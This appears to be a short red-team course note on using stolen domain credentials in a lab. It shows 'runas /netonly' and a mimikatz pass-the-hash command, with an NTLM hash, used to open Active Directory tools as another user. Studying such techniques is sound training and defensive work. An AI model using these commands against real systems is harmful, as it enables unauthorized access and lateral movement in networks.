
Starting a graphical interface to connect to a remote server which you have a token for:

```
PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe
Enter the password for DEV\bfarmer:
Attempting to start mmc.exe as user "DEV\bfarmer"
```

`mmc.exe` is a Windows tool responsible for creating/saving/opening consoles.
Go to **File > Add/Remove Snap-in** (or Ctrl + M for short), add the ADUC snap-in, then click OK.  Right-click on the snap-in, select **Change Domain**, enter `dev.cyberbotic.io` and click OK.  You will see Proxifier begin to capture and relay traffic and ADUC loads the content.  You may continue to drill down into the users and computers etc.

#### with Mimikatz

Another example using mimikatz to [[Pass the Hash]]:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 18:23
🏷️ tags: #redteam #crto 

---

